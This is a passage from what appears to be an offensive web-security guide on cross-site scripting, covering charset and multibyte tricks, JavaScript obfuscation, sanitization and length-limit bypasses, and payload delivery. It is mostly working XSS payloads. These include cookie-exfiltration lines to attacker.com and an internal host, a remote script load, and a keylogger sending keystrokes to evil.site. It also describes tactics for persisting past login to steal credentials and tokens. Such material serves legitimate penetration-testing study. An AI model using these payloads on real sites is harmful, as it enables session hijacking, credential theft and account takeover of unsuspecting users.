<script>alert(document.cookie)</script>
```

Now observe how this payload can be encoded in different character sets to evade basic filtering:

UTF-7 Encoding:

```
+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-
```

In UTF-7, characters like ```<``` (```<``` becomes ```+ADw-```) and ```>``` (```>``` becomes ```+AD4-```) are represented with ASCII-safe sequences. Some older browsers and systems incorrectly interpret UTF-7 input, and if the filter doesn’t decode or sanitize this format before rendering, your payload executes.

This encoding trick is only effective if the browser interprets the response as UTF-7. Otherwise, the payload is just noise. This brings us to a key technique...

**Forcing the Browser to Use a Specific Character Set:**

If you can influence the response headers or HTML metadata, you can potentially *force* the browser to interpret the payload using your chosen character set.

Manipulating the ```Content-Type``` Header Example:

Let’s say you’re crafting a response or reflecting input via an endpoint. You could try something like:

```
GET /vuln?input=+ADw-script+AD4-alert(1)+ADw-/script+AD4- HTTP/1.1
Host: vulnerable.site
Accept-Charset: UTF-7
```

Or if you’re controlling the response:

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-7
```

Alternatively, within the HTML:

```
<meta http-equiv="Content-Type" content="text/html; charset=UTF-7">
```

Some applications even accept a ```charset``` parameter in a URL or POST body, allowing you to *set* the response encoding indirectly. If so, that’s an open door for this kind of trickery.

**Bypassing Filters Using Multibyte Character Sets (e.g., Shift-JIS):**

Multibyte character sets like *Shift-JIS*, *BIG5*, or *EUC-JP* encode certain characters using two bytes. This opens the door to weird parsing behaviors—especially when byte sequences *accidentally form valid characters* or *prevent proper interpretation of delimiters* like quotes or angle brackets.

Suppose a web page reflects two user inputs in the following format:

```
<img src="image.gif" alt="[input1]" /> ... [input2]
```

Filter rules:

- input1 blocks *quotes* (```"```) to prevent breaking out of the attribute.

- input2 blocks *angle brackets* (```<```, ```>```) to prevent injecting HTML.

Now, let’s say you submit:

- input1: ```%f0```

(This is a raw byte, not URL-decoded to ASCII—it’s interpreted as part of a 2-byte sequence in Shift-JIS.)
 
- input2: ```" onload=alert(1);```

What happens?

In Shift-JIS, ```0xF0``` is used to signal a multibyte character. When ```%f0``` is placed in ```input1```, the parser *waits* for a second byte (which it doesn’t get here, but the browser keeps parsing). When it hits the double quote in ```input2```, it interprets it as the *end* of the ```alt``` attribute. The rest (```onload=...```) is then interpreted as a legitimate attribute on the ```img``` tag. So the resulting HTML might become:

```
<img src="image.gif" alt="?" onload=alert(1); />
```

That fires JavaScript—filter bypass successful!

*How Relevant Is This Today?*

Modern browsers have *patched UTF-8-based multibyte abuse* (like this used to work with broken UTF-8 sequences), but *less common encodings* like *Shift-JIS*, *EUC-JP*, and *BIG5* are still viable in some edge-case setups. These are still dangerous in:

- Legacy systems using Asian locales.

- Non-English sites with loose character set handling.

- Applications that trust user-supplied ```charset``` parameters or headers.

*TL;DR on Lesser-Known Multibyte Character Sets:*

- Shift-JIS: Used for Japanese text. Has many 2-byte sequences that can include bytes like ```0x5C``` (backslash) or ```0x22``` (quote), leading to misinterpretation by HTML parsers.

- EUC-JP: Another Japanese encoding, similar to Shift-JIS in trick potential.

- BIG5: Common in traditional Chinese systems. Vulnerable for the same reasons—dangerous byte sequences can disrupt normal parsing.

*Key trick:* These encodings allow you to "hide" dangerous characters inside multi-byte sequences. To the filter, it’s safe. To the browser? Boom—code execution.

#### 11. Bypassing Filters: Script Code

In some situations, you may successfully inject a *script context* into an application’s response—getting ```<script>...</script>``` to execute. However, you might still face *filtering mechanisms* that attempt to block the use of certain *JavaScript keywords, special characters* (like ```(```, ```)```, ```.```, ```'```, ```"```, ```[```), or *entire functions* like ```eval```, ```alert```, or ```document```.

To evade these restrictions, various *obfuscation* and *encoding* techniques can be used to sneak past input sanitization while preserving functionality.

**JavaScript Escaping:**

JavaScript supports *multiple escape formats* to represent characters:

- Unicode escapes: ```\uXXXX``` format (4-digit hex)

- Hexadecimal escapes: ```\xXX``` format (2-digit hex)

- Octal escapes: ```\NNN``` format (rarely supported nowadays)

These can help you bypass filters that look for raw characters or keywords like ```alert```.

*Example 1 – Unicode escape:*

```
<script>a\u006cert(1);</script>
```

- ```\u006c``` = lowercase ```l```

- So the decoded version is:

```
<script>alert(1);</script>
```

This is valid syntax and will trigger an alert, assuming the filter doesn't decode escapes before checking.

**Using ```eval()``` to Hide Payloads:**

```eval()``` takes a *string* as input and executes it as JavaScript. This makes it a double-edged sword: super useful for obfuscation—but heavily restricted on modern platforms (especially with CSP and modern linters).

*Example 2 – Escaped keyword inside eval:*

```
<script>eval('a\u006cert(1)');</script>
<script>eval('a\x6cert(1)');</script>
<script>eval('a\154ert(1)');</script>
```

Decoded, all three become:

```
<script>eval('alert(1)');</script>
```

These work by hiding ```alert``` inside the string passed to ```eval```.

**Weird Escape Characters Inside Strings:**

JavaScript is surprisingly tolerant of junk inside strings.

*Example 3 – Broken-looking but works:*

```
<script>eval('a\l\ert\(1\)');</script>
```

Even though it looks broken:

- ```\l``` and ```\e``` are ignored because they are invalid escapes

- ```\(1\)``` is treated as normal ```(``` and ```)``` inside string

- Final string passed to eval: ```alert(1)```

So this still pops an alert.

**Dynamically Constructing Strings:**

If you can’t use keywords or full commands directly, you can *build them* at runtime:

*String concatenation:*

```
<script>eval('al'+'ert(1)');</script>
```

- Joins ```"al"``` + ```"ert(1)"``` → ```"alert(1)"```

**Using ```String.fromCharCode```:**

```
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41));</script>
```

- Translates to: ```eval("alert(1)")```

Character codes:

- Those numbers are ASCII codes, and the function ```String.fromCharCode(...)``` takes a sequence of those and converts them into characters.

- 97 = ```'a'```, 108 = ```'l'```, 101 = ```'e'```, 114 = ```'r'```, 116 = ```'t'```

- 40 = ```'('```, 49 = ```'1'```, 41 = ```')'```

**Base64 Decoding:**

```
<script>eval(atob('YWxlcnQoMSk='));</script>
```

- ```atob()``` decodes Base64 → ```"alert(1)"```

- Firefox and some modern browsers allow this

- Nice if ```alert``` is filtered but ```eval(atob(...))``` isn't

**Alternatives to ```eval()```:**

If ```eval``` is blocked, try using *callback-like behaviors* or implicit coercion.

*Using ```.replace()``` with ```eval``` as callback:*

```
<script>'alert(1)'.replace(/.+/, eval)</script>
```

- ```/.+/``` matches entire string

- ```eval``` used as a callback

- Internally becomes: ```eval('alert(1)')```

- In this context, *a callback* is just a function that gets *passed into another function* to be executed later—usually after something finishes loading or completes.

So when something like:

```
someLibrary.loadData(url, eval)
```

happens, ```eval``` is being passed as a *callback function*—meaning: *“After the data is loaded from ```url```, take that data and feed it into ```eval()```.”*

If the attacker controls the content at that ```url```, they can inject malicious code, which ```eval()``` then runs = instant XSS doom. That’s why using ```eval``` as a callback is dangerous—it blindly trusts input as code.

**Alternatives to Dot (```.```):**

Some filters block the ```.``` character to prevent access to ```document.cookie```, ```window.location```, etc. But dots can be bypassed with:

*Bracket notation:*

```
<script>alert(document['cookie'])</script>
```

- ```document['cookie']``` = ```document.cookie```

- The ```'cookie'``` string avoids using a literal dot

*Using ```with()``` block:*

```
<script>with(document)alert(cookie)</script>
```

- The ```with()``` statement sets ```document``` as the scope

- So just writing ```cookie``` = ```document.cookie```

This can evade filters that watch for both ```document``` and ```.``` usage.

*Final Notes & Tips:*

- These techniques still work in many places, especially old apps or weak WAFs.

- However, modern defenses like *CSP*, *JS linters*, and *framework-level escaping* reduce the effectiveness.

- Always test against a real target to know which ones survive their filters.

#### 12. Combining Multiple Techniques:

Often, bypassing modern XSS filters requires *layered obfuscation.* Instead of relying on a single trick, attackers combine multiple encoding techniques, script languages, and syntactic quirks to sneak past defenses.

**HTML + JavaScript Obfuscation:**

Sometimes, JavaScript is embedded in *HTML tag attributes* (like ```onerror```, ```onclick```, etc.). When this happens, browsers will first decode any HTML entities (like ```&#x5c;```), *then* run the resulting JavaScript—giving attackers a chance to sneak in payloads through encoded layers. Example:

```
<img onerror=eval('al&#x5c;u0065rt(1)') src=a>
```

This becomes:

```
<img onerror=eval('al\u0065rt(1)') src=a>
```

Then the browser interprets the JS as:

```
eval('alert(1)');
```

So the ```e``` in ```alert``` is escaped as ```\u0065```, and the backslash (```\```) is encoded as ```&#x5c;```, making the whole thing look cleaner to filters.

Non-obfuscated version:

```
<img onerror=eval('alert(1)') src=a>
```

Heavily encoded example:

```
<img onerror=&#x65;&#x76;&#x61;&#x6c;&#x28;&#x27;al&#x5c;u0065rt&#x28;1&#x29;&#x27;&#x29; src=a>
```

Becomes:

```
<img onerror=eval('al\u0065rt(1)') src=a>
```

Then becomes:

```
eval('alert(1)');
```

Filters focusing only on literal patterns like ```"eval"``` or ```"alert"``` may miss it due to the layered encoding.

**Using VBScript (IE-specific):**

JavaScript isn't the only browser-scripting game in town—at least it wasn't in the past. Internet Explorer supported VBScript, a scripting language with its own syntax and quirks. While mostly *deprecated and unsupported today*, it's a cool historical curiosity (and still useful for testing legacy systems).

Basic VBScript attack:

```
<script language=vbs>MsgBox 1</script>
```

With ```onerror```:

```
<img onerror="vbscript:MsgBox 1" src=a>
```

No quotes, using operator:

```
<img onerror=MsgBox+1 language=vbs src=a>
```

Explanation:

- ```MsgBox+1``` gets interpreted as ```MsgBox 1``` (since ```+1``` coerces the value ```1```).

- Avoids using quotes altogether, which many filters block.

- Works because VBScript allows calling some functions *without parentheses.*

VBScript is *case-insensitive*, so it still works when input is uppercased:

```
<SCRIPT LANGUAGE=VBS>MSGBOX 1</SCRIPT>
```

Useful if an app auto-converts everything to uppercase (which breaks case-sensitive JavaScript like ```alert()```).

**Mixing JavaScript & VBScript:**

Want to add layers to your payloads like an evil programming onion? You can *bounce between VBScript and JavaScript*, using each to call the other.

JavaScript calling VBScript:

```
<script>execScript("MsgBox 1", "vbscript")</script>
```

VBScript calling JavaScript:

```
<script language=vbs>execScript("alert(1)")</script>
```

Nesting (multi-layered attack):

```
<script>execScript('execScript("alert(1)","javascript")',"vbscript");</script>
```

**Note:** ```execScript``` is IE-specific, and this technique is now *defunct on modern browsers.* But in legacy testing or CTFs, it still teaches you the mindset of creative execution routing.

**Case Bypass via String Functions:**

If an app forces all input into uppercase, JavaScript-based payloads like ```alert(1)``` break. But VBScript can fix the case *at runtime*:

```
<SCRIPT LANGUAGE=VBS>EXECSCRIPT(LCASE("ALERT(1)"))</SCRIPT>

<IMG ONERROR="VBS:EXECSCRIPT LCASE('ALERT(1)')" SRC=A>
```

```LCASE("ALERT(1)")``` becomes ```"alert(1)"```, which gets passed to ```execScript```, restoring the original JavaScript form.

*Modern-Day Relevance:*

- *VBScript is deprecated* in modern browsers, and completely unsupported in anything other than legacy IE.

- Techniques like HTML/Unicode/Hex encoding, dynamic string building, and layered evaluation *are still very relevant.*

- These examples are great for learning how to think obliquely, bypassing filters via alternate syntax and encoding tricks.

#### 13. Using Encoded Scripts & Beating Sanitization:

In the eternal cat-and-mouse game of XSS, the defenders build filters—and the attackers find ways to sneak around them. One such ancient yet intriguing trick involves *encoded scripts* and understanding how sanitization fails in subtle ways.

**Encoded Scripts in Internet Explorer:**

Microsoft once introduced a *custom encoding* format for client-side scripts to deter code theft. It didn’t last long—people quickly reversed it. Still, for a while, you could write stuff like this:

```
<img onerror="VBScript.Encode: #@~^sCAAAAA==\ko$K6,FoQIAAA==A#~@" src=a>
```

or:

```
<img language="JScript.Encode" onerror="#@~^aCAAAAA==Ca+.D'8#mgIAAA==A#~@" src=a>
```

Breakdown:

- ```#@~^...#~@``` marks the beginning and end of an encoded script.

- This was encoded using Microsoft’s ```screnc.exe``` tool (Script Encoder).

- The idea: obfuscate script contents so people can’t read them easily.

- These strings would get decoded and executed by older versions of IE.

Modern reality: This method is *obsolete.*

- Microsoft *deprecated VBScript and removed script encoding support* in modern browsers.

- ```screnc.exe``` doesn’t ship with modern Windows, and it’s not part of official MS dev tools anymore.

- You can still decode these via online tools or Python scripts if needed (for CTFs or malware analysis).

**Understanding and Defeating Sanitization Filters:**

When apps try to protect against XSS, they often apply *sanitizing filters*—these attempt to clean or rewrite your input to make it safe. But they're frequently flawed.

Basic Sanitization Example:

If the app replaces key characters with HTML entities:

```
<script>alert(1)</script>
```

becomes:

```
&lt;script&gt;alert(1)&lt;/script&gt;
```

This neuters the payload. But things get interesting when...

**Tactics for Beating Sanitization:**

Step 1: Identify What's Being Filtered

Sometimes, only certain tags or expressions are being removed. You might not need ```<script>``` at all—maybe an ```<img onerror=...>``` or ```<svg onload=...>``` does the trick.

Some filters only remove the *first* match. Try stacking inputs:

```
<scriptxscript>alert(1)</script>
```

- First ```<script>``` removed, but the second one is malformed enough to pass.

- Still closes a tag and triggers ```alert(1)```.

Or recursive failure:

```
<scr<script>ipt>alert(1)</script>
```

After stripping the inner ```<script>```, it becomes:

```
<script>alert(1)</script>
```

Filter defeated.

Try combo-bypass like this:

```
<scr<object>ipt>alert(1)</script>
```

- If both ```<script>``` and ```<object>``` are stripped recursively, they may “cancel each other out” in weird ways.

**Escaping Quote Sanitization in JavaScript Strings:**

Some filters escape quotes like this:

```
var a = 'foo';
```

But the app escapes it:

```
var a = 'foo\'; alert(1);//';
```

Bypass: Use a backslash to break out:

```
foo\'; alert(1);// 
```

Your ```alert(1)``` executes, and the comment prevents syntax errors.

*Additional Notes:* We try to inject ```'foo'```, but the app *automatically escapes* the quote—so it becomes ```'foo\'``` in the final output. That backslash is an escape character, and it’s trying to "protect" the quote by making it part of the string instead of ending the string.

So yes, the issue was the app inserting that rogue backslash (```\```)—not the slashes at the end. The ```//``` at the end was our doing, used to comment out anything that comes after and repair the syntax after we sneak in ```alert(1)```.

That’s why we append something like ```//``` or ```/*``` afterward—to *comment out* the rest of the line so the broken syntax doesn’t crash the script. Without that comment, the trailing ```\'``` could cause a syntax error. With it? Clean injection.

If you want to *fully escape the escape* and close the string safely, you’d need to go one level deeper. Inject something like:

```
'foo\\\\';alert(1);//
```

- In the code: ```'foo\\\\';alert(1);//'```

- At runtime: ```'foo\\'``` — the string is closed properly

- Then ```alert(1)``` gets executed

So yes—*escaping the escape is also possible*, but you need to really understand how many escape layers are at play. The more paranoid the app is, the more fun we get to have.

**Escaping via Tag Injection:**

If you can’t break the string but angle brackets (```< >)``` are *not filtered*, do this:

```
</scriptxscript><script>alert(1)</script>
```

Or even sneak this:

```
<script>var a = '</scriptxscript><script>alert(1)</script>';
```

Clarification:
 
- You're injecting a ```</script>``` tag to close the active script.

- Then your ```<script>alert(1)</script>``` runs independently.

- Even if the original script is broken, the browser still parses and runs the new script.

This leverages how *HTML parsing takes priority* over JS parsing. Browsers are forgiving beasts.

**When You Can't Use Quotes:**

If your input is within a JavaScript string and quotes are blocked, use ```String.fromCharCode()```:

```
eval(String.fromCharCode(97,108,101,114,116,40,49,41));
```

Outputs: ```alert(1)```

**HTML-Encoded Quotes in Event Handlers:**

You're injecting into this:

```
<a href="#" onclick="var a = 'foo'; ...">
```

Your input is sanitized like:

```
foo&apos;; alert(1);// 
```

HTML entity ```&apos;``` becomes ```'``` during browser decode. Final result:

```
<a href="#" onclick="var a = 'foo'; alert(1);//'; ...">
```

Success! Script executes.

Moral: In attributes like ```onclick```, browsers decode *before* JavaScript execution. Encoding your quotes with HTML entities might be a *bypass*, not a blocker.

*Final Notes:*

- Obsolete tricks like ```JScript.Encode``` are fun for legacy systems or CTFs.

Modern sanitizers are better but still buggy, especially with:

- Nested tags

- Recursive filtering

- JavaScript-injected strings

- Mixed encoding and decoding layers

Always test the filter's limits: recursive behavior, quote escaping, and tag handling.

#### 14. Beating Length Limits:

Sometimes, an application restricts the *maximum length* of user input — say, 20 characters max per input field. This can mess with your ability to inject complete scripts or payloads like ```<script>alert(1)</script>```, which is 24 characters long by itself. But fret not — there are crafty ways to beat these limitations.

**Technique 1: Use Shorter Payloads (JavaScript Golfing):**

If you're injecting into an *existing script block*, you can shorten your code by stripping syntactic fluff. Original verbose payload:

```
<script>document.location='http://attacker.com?c='+document.cookie</script>
```

28-byte minimal variant:

```
open("//a/"+document.cookie)
```

Injected into an existing script like this:

```
<script>
var exfil = open("//a/"+document.cookie);
</script>
```

This uses the ```open()``` function (like ```window.open```) with a relative URL ```"//a/"``` — and that a could be a WINS-resolvable hostname. WINS (*Windows Internet Name Service*) is like the old-school, internal-only cousin of DNS. In corporate networks, it resolves NetBIOS names to IP addresses. So ```http://a/``` could resolve to ```http://192.168.1.23/``` if "a" is registered in WINS. Great for red-team ops where internal resolution leaks to the attacker machine.

**Technique 2: Minified Script Tags for HTML Injection:**

If you're injecting into HTML, keep it tight. 30-byte example:

```
<script src=http://a/x.js>
```

Here, ```http://a/``` is again assumed to be a resolvable internal address. No quotes, no closing tag needed — browsers will often tolerate this sloppiness (though not always across all browsers anymore).

**Technique 3: Spread the Payload Across Multiple Fields:**

Sometimes, a page includes *several user-controlled parameters*, each reflected into the page in different fields, like this:

Given page:

```
<input type="hidden" name="page_id" value="244">
<input type="hidden" name="seed" value="129402931">
<input type="hidden" name="mode" value="normal">
```

You might only control the *query parameters:*

```
https://wahh-app.com/account.php?page_id=244&seed=129402931&mode=normal
```

And if each parameter is *length-limited*, your full payload won't fit in just one. So instead, *split the attack across all three!*

Build a full script like this:

```
<script>/*payload_part_1*/payload_part_2/*payload_part_3*/</script>
```

JavaScript treats ```/* ... */``` as comments. So if we stuff the middle of our payload with those, the code still works.

Final Exploit — injected URL:

```
https://myapp.com/account.php?
page_id="><script>/*&
seed=*/alert(document.cookie);/*&
mode=*/</script>
```

Let’s URL-decode and inject those into the HTML:

Generated HTML:

```
<input type="hidden" name="page_id" value=""><script>/*">
<input type="hidden" name="seed" value="*/alert(document.cookie);/*">
<input type="hidden" name="mode" value="*/</script>">
```

To clarify, you can inject payloads like that directly into:

- HTML body: if you find a place where your input is echoed into a <script> tag or HTML inline.

- URLs: especially in reflected XSS or when the page pulls content dynamically based on query parameters.

*What Just Happened?*

Now visually isolate the meaningful script parts:

```
<script>/* --> starts script and comment
*/alert(document.cookie);/* --> ends comment, executes payload, opens another comment
*/</script> --> ends comment and closes script
```

All the junk in the middle (HTML fields, attributes) gets *ignored by the browser* because it falls *inside* JavaScript comments. The payload gets glued together like it was never split. Here's the one-liner version of that payload:

```
<script>/*-->*/alert(document.cookie);/*</script>
```

*Why It Still Works?*

The ```/*``` and ```*/``` are *JavaScript comment delimiters*, and browsers *don’t care if the comment is unclosed or oddly placed inside* ```<script>```, as long as the JS code that needs to run is outside the comment block. So even though the payload *looks* disjointed or malformed, the JS engine happily parses and runs the ```alert(document.cookie);``` line because it's in a valid spot between comment sections.

*Additional Notes:* The reason you see weird stuff like ```/*-->*/``` is because it's an old-school trick meant to handle *HTML parsing quirks in ancient browsers.* Back in the Netscape/IE4 days, people would write things like this to prevent older browsers from displaying the script as plain text:

```
<script><!--
alert('hi');
//--></script>
```

So ```/*-->*/``` is just blending the end of that HTML-era workaround into JS comments. But *modern browsers don’t need that nonsense anymore*, so the following version is also perfectly valid and clear:

```
<script>/**/alert(document.cookie);/*</script>
```

In fact, it’s preferred now when explaining or using comment injection/obfuscation. Overall, the idea is to *break out* or sneak into a script context, and comment tricks like ```/**/``` or ```/*...*/``` help bypass filters or neutralize the tail end of existing code.

*Conclusion:* You can split the attack across multiple parameters, bypassing filters that act independently on each field.

- ```page_id``` and ```mode```: Short fields (max 12 characters), so *no filtering* is in place — too small for a full XSS anyway, right? Wrong. They’re still useful.

- ```seed:``` Long field, so devs *did* slap on strict filters — no ```<```, ```>```, or full scripts allowed.

We use ```page_id``` and ```mode``` to set up the JavaScript context — like sneaking ```<script>``` into one and maybe ```>``` into the other. Then, in the ```seed``` parameter (the long one), we inject only the JS logic, no tags needed — just ```alert(1)``` or anything. *Even though ```seed``` is filtered, it doesn’t need ```<script>``` because that’s already in place, thanks to the other fields.*

*Filters applied per field can be bypassed if those fields work together in the rendered output.* The page doesn’t see separate values — it sees the *final HTML formed by their combination.* In hacking terms: *fragmentation = evasion.* This is one of the coolest forms of "payload weaving."

*Notes and Pitfalls:*

- Watch out for escaping issues (quotes, angle brackets).

- You’ll often need to trial and error the injection to match the context.

- This only works if multiple reflected parameters *end up in the same context* (e.g., same ```<script>``` block).

**Technique 4 – Leveraging DOM-Based XSS to Evade Length Restrictions:**

Another clever way to bypass length restrictions, especially when dealing with reflected XSS, is to *leverage DOM-based XSS* behavior instead. This involves injecting a *very short initial script* that instructs the browser to execute a *much longer secondary payload* from a part of the URL that isn’t filtered by the application — like the fragment identifier (```#```).

Basic Idea: Inject a *tiny reflected script* into a vulnerable parameter that evaluates the fragment (```location.hash```), like this:

```
<script>eval(location.hash.slice(1))</script>
```

This is only 45 bytes long and can easily bypass many length filters. Once the browser parses the response and executes this code, it will evaluate whatever comes after the ```#``` in the URL — a part of the URI that *never reaches the server* and is therefore *not subject to input filtering or logging.*

Real-World Example:

```
http://example.com/error?message=<script>eval(location.hash.slice(1))</script>#alert(1)
```

- The vulnerable ```message``` parameter reflects the short script back into the HTML.

- The browser parses and executes it.

- The ```location.hash.slice(1)``` expression grabs ```alert(1)``` from the ```#alert(1)``` part and runs it via ```eval```.

Since ```location.hash``` includes everything after the ```#```, and ```.slice(1)``` removes the ```#``` itself, the resulting payload is clean and ready for ```eval()```. You now have *an unlimited-length, unfiltered script execution vector.*

*Additional Notes:* The purpose of ```location.hash``` is to grab the *fragment identifier* in the URL — that’s the part after the ```#```. For example, in:

```
http://example.com/page?message=<script>eval(location.hash.slice(1))</script>#alert(1)
```

The ```location.hash``` equals ```#alert(1)```, and ```location.hash.slice(1)``` removes the ```#``` and gives just ```alert(1)```. So when the page loads and the ```<script>``` tag executes, it runs ```eval('alert(1)')```, which pops the alert.

And yes — for this to work, the *fragment must be present in the URL.* The beautiful trick here is that the browser handles ```#...``` purely on the client side: *it’s never sent to the server*, so any filters or logs the server has will never even see it. That’s how you can sneak in long or filtered-out payloads — they live entirely in the fragment and bypass all server-side filtering.

The initial ```eval(location.hash.slice(1))``` is like planting a tiny loader that detonates whatever you stash in the hash.

You can shrink the injection even further using a clever trick involving *URL decoding and JavaScript comment behavior:*

```
http://example.com/error?message=<script>eval(unescape(location))</script>#%0Aalert('pwned')
```

Breakdown:

- ```eval(unescape(location))```: This decodes the full URL (including the fragment) and passes it to ```eval()```.

- ```#%0A```: The ```%0A``` is a URL-encoded newline. When decoded, it ends the single-line comment that starts at ```//``` in the URL (```http://...``` becomes ```http: //...```).

- ```alert('pwned')``` sits on a new line, executing as valid JavaScript.

So essentially, the browser sees this:

```
eval("http: //example.com/error?message=<script>eval(unescape(location))</script>
alert('pwned')")
```

And that line gets executed by ```eval``` — the first line is treated as a comment, and the second line ```(alert('pwned'))``` is executed as actual code.

*Additional Notes:* When the browser sees something like this in a script:

```
eval(location.hash.slice(1))
```

and the fragment is:

```
#http://example.com
```

then this whole thing becomes:

```
eval("http://example.com")
```

But that's *not valid JavaScript* — the browser sees ```//``` in ```http://``` and thinks it’s starting a *comment*, like this:

```
http: //example.com
```

Everything after ```//``` gets ignored because it's treated as a comment. That breaks your payload! Now, if you sneak in a newline like ```%0A``` (which decodes to ```\n```), you *end the comment.* So:

```
#http:%0Aalert(1)
```

Becomes:

```
eval("http:\nalert(1)")
```

And now the comment is done, and ```alert(1)``` executes! So the newline *cuts off the comment started by* ```//```, letting your code run freely in the next line. It’s a clever way to break out of syntax hell.

Also, if you're *in control* of the fragment (everything after the ```#```), then yeah — you can totally ditch the ```http://``` and just drop your payload in clean and dry, like:

```
#alert(1)
```

Which becomes:

```
eval("alert(1)")
```

And it runs beautifully.

BUT — in the scenario from the book, the whole point is: you're *not* injecting into the ```eval()``` directly. Instead, the application logic might be doing something weird like:

```
<script>eval(location.hash)</script>
```

Or:

```
<script>var data = location.hash; eval(data)</script>
```

Now if the *entire page URL* was:

```
http://victim.com/page#http://example.com
```

...you’re stuck with that ```http://```, because the app or the browser added it. Maybe it's a URL-redirect page, or it's parsing stuff from the hash expecting a URL. So: if you *can* drop the ```http://```, yes — do it. But if you *can’t*, you use the newline trick to *break out* and keep your payload alive despite the browser's syntax quirks. That's the whole sneaky beauty of ```%0A```.

*Conclusion:*

- Bypasses input length restrictions on reflected parameters.

- Avoids server-side filtering since everything after ```#``` is invisible to the backend.

- Grants more control over script complexity and encoding.

- Useful against apps that sanitize the visible parameters but don’t expect the client-side environment to be weaponized.

Overall, you should avoid using ```eval()``` in legitimate scripts, as it creates massive security holes — which is exactly what we're abusing here.

### Delivering Working XSS Exploits:

When testing XSS vulnerabilities, you're often operating outside the browser, using tools like *Burp Repeater* to craft, tweak, and fire the same request over and over — slowly carving your payload like a ritual sigil that evades filters. This helps build a proof-of-concept, but it doesn’t stop there. Crafting an actual *weaponized payload* that works *in the wild* against other users often involves overcoming unexpected challenges:

- The XSS vector might only be accessible through non-obvious headers like ```Referer```, ```Origin```, or cookies.

- The victim's browser might have XSS filters or modern protections that neutralize basic attacks.

- The injection point might be in a dull, unauthenticated section, far from the juicy secrets behind the login wall.

So what now?

Let's say you found XSS in a boring area — like a product feedback form or search box — but the real treasure lies beyond the login page. Don't shrug it off. Instead, you can persist the attack and let it follow the user like a shadow across the application.

#### iframe-based Persistence: The Ghost Window Technique:

One classic trick is to use JavaScript to create a *full-screen iframe* that reloads the vulnerable page — now injected with your payload. While the user browses and even logs in, your malicious script stays alive in the *top-level window.* Meanwhile, the iframe acts like the site, behaving normally to the user.

Your payload can:

- Hook into *form submissions, clicks,* and *navigation events.*

- Monitor *HTTP responses* inside the iframe using ```MutationObserver``` or JS injection.

- Exfiltrate *session cookies, CSRF tokens,* or even credentials typed into login forms.

In modern browsers, you can even spoof the location bar using:

```
history.pushState({}, "", "/authenticated-area");
```

This makes the whole thing feel real to the victim, while your payload watches silently like a digital wraith.

*Additional Notes:* The ```history.pushState({}, "", "/authenticated-area");``` line is part of the browser's *History API.* Here's what it's doing, broken down:

- ```history.pushState(...)```: adds a new entry to the browser's session history *without reloading the page.*

- ```{}```: this is the state object — in this case, an empty one. You could store some custom data here for later use with ```popstate```.

- ```""```: this would be the title, but it's ignored by most browsers.

- ```"/authenticated-area"```: this is the new URL path shown in the address bar — again, *without navigating to a new page.*

*So, why is it interesting?* In XSS attacks, it can be used to:

- Clean up the URL (hide ```#fragment``` or other junk after the payload has executed).

- Make things look more legit or polished.

- Create the illusion of navigation to a secure or authenticated section.

- Potentially avoid detection by some logging systems or alerting tools.

**Myth:** *"Unauthenticated XSS isn't dangerous"*

Wrong. Danger scales *before* login, not after. Here’s why:

1. *Broader reach:* XSS in the public-facing part of a site means *any* visitor is fair game. No login barrier, no scope limit.

2. *Silent persistence:* Even if a user isn't logged in yet, you can plant a keylogger or session-hijack script that waits. Once they log in, your script is already in place, ready to:

- Steal session cookies

- Log credentials typed into forms

- Hijack account tokens

```
document.addEventListener("keydown", function(e) {
    fetch("https://evil.site/logger", {
        method: "POST",
        body: JSON.stringify({key: e.key})
    });
});
```

*What's going on:*

- ```document.addEventListener("keydown", ...)```: This listens for every single keystroke on the page.

- ```e.key```: This grabs the actual character pressed (like ```"a"```, ```"1"```, ```"Enter"```, etc.).

- ```fetch(...)```: Sends that character off to ```https://evil.site/logger``` via an HTTP POST request.

- ```JSON.stringify(...)```: Wraps the key in a little JSON payload, so the receiving server can easily parse it.

Overall, this turns any form field (like login or search bars) into a real-time data leak. Combine this with XSS, and suddenly you're siphoning keystrokes without needing a visible login form or user interaction.

**Notes:**

- The iframe trick may be blocked by *Content Security Policy (CSP)* or ```X-Frame-Options```. Bypass it by pivoting to *JavaScript-only persistence*, like attaching scripts to DOM events or injecting into stored locations (e.g., localStorage, cookies, service workers if poorly configured).

- Some browsers use *XSS Auditor-style protections.* These can sometimes be bypassed by *breaking the script into parts*, using ```eval()```, ```setTimeout()```, or inline decoding like:

```
setTimeout("eval(atob('YWxlcnQoZG9jdW1lbnQubG9jYXRpb24p')", 1000);
```

*What's happening here:*

- ```atob(...)```: Decodes a Base64-encoded string. ```'YWxlcnQoZG9jdW1lbnQubG9jYXRpb24p'``` becomes: ```alert(document.location)```

- ```eval(...)```: Takes the decoded string and executes it as JavaScript.

- ```setTimeout(..., 1000)```: Delays execution by 1000 milliseconds (1 second), which can:

Evade naive detection or timing-based filters.

Give the DOM or page time to fully load before executing.

- The result: One second later, it pops up the current page URL via an alert box.

*Why it’s interesting?*

- *Obfuscation:* Hides the actual malicious code (```alert(...)```) from casual inspection, especially in logs or basic filters.

- *Dynamic execution:* Combines ```eval``` and ```atob``` to execute arbitrary payloads — a classic trick for bypassing blacklist filters.

- *Modular:* The Base64 can be swapped out for any code — not just alerts, but data exfiltration, DOM manipulation, etc.

When attacking authenticated users, always *chain payloads:*

1. Initial reflected XSS → drop malicious JS

2. JS attaches to page events or runs silently

3. Waits until user logs in

4. Attacks session, captures credentials, or performs CSRF-like actions

**TL;DR:**

- Public XSS is often more dangerous than authenticated ones.

- You *can* follow the user beyond login — persist your payload, play the long game.

- Don't just pop an alert box — build scripts that listen, persist, and strike at the right moment.

- Treat XSS like possession — once you're in, don't let go.

#### Modifying the Request Method: GET vs POST in XSS Delivery:

Sometimes, an XSS vulnerability may only manifest when a request is sent using the ```POST``` method — for example, a search form or comment submission that reflects user input back into the page. However, delivering such an attack via ```POST``` isn't always practical from an attacker’s standpoint. Consider this scenario:

You’ve discovered a reflected XSS in a POST request — but you want to deliver the payload through an ```<img>``` tag embedded in a public forum post. The ```img``` tag will trigger a ```GET``` request, not a ```POST```, which seemingly blocks your exploit path.

In these cases, it's essential to test if the server tolerates switching the request method from ```POST``` to ```GET```. Many web applications are surprisingly lenient and will process both methods similarly — especially when input handling logic is shared between routes or poorly validated.

Try This in Burp:

Right-click on the request in Burp Suite and select *"Change Request Method"*. This automatically swaps ```POST``` ↔ ```GET```, moves parameters between the body and the URL query string, and updates the headers (like ```Content-Type```) accordingly.

**Mythbuster Alert:** *“This XSS bug isn’t exploitable because I can’t deliver it with a ```GET``` request.”*
